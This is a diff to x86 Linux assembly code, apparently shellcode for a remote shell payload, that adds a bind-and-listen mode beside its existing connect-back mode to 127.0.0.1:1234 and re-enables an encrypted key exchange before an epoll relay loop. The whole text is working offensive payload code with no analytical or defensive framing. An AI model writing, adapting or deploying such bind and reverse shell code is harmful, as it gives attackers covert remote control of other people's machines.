@@ -224,6 +224,7 @@ opn_con:
       int    0x80 
       stosd                    ; save socket
 
+%ifndef BIND
       push   0x0100007f  ; sa.sin_addr=127.0.0.1
       push   0xD2040002  ; sa.sin_port=htons(1234)
                          ; sa.sin_family=AF_INET
@@ -233,21 +234,44 @@ opn_con:
       push   16                ; sizeof(sa)      
       push   ecx               ; &sa
       push   eax               ; s
-      mov    ecx, esp          ; &args
-epx_con:      
+      mov    ecx, esp          ; &args      
       push   SYS_CONNECT
       pop    ebx               ; ebx = SYS_CONNECT
       push   SYS_socketcall
       pop    eax
       int    0x80      
+%else
+      pop    ebx               ; ebx=2, SYS_BIND
+      pop    esi               ; esi=1
+      push   0x10              ; sizeof(sa)
+      push   ebp               ; &sa
+      push   edi               ; s
+      mov    ecx, esp          ; ecx=&args      
+      mov    al, SYS_socketcall
+      int    0x80
 
+      mov    [ecx+4], edx      ; clear sa from args
+
+      ; listen for incoming connections
+      ; listen (s, 0);
+      mov    al, SYS_socketcall
+      mov    bl, SYS_listen
+      int    0x80
+
+      ; accept connections
+      ; accept (s, 0, 0);
+      mov    al, SYS_socketcall
+      inc    ebx               ; ebx=sys_accept
+      int    0x80
+%endif
+      
       ; attempt to secure the connection
-      ;call   key_xchg
-      ;jle    cls_sck  
+      call   key_xchg
+      jle    cls_sck  
       
       ; efd = epoll_create1(0);
       mov    eax, SYS_epoll_create1
-      xor    ebx, ebx
+      xor    ebx, ebx          ; sets CF=0
       int    0x80
       stosd                    ; save efd
       
@@ -265,7 +289,7 @@ poll_init:
       pop    ecx
       int    0x80
       mov    edx, [ebp+p_out]  ; do out[0] in 2nd loop      
-      cmc
+      cmc                      ; !CF
       jc     poll_init      
       ; now loop until user exits or some other error      
 poll_wait:
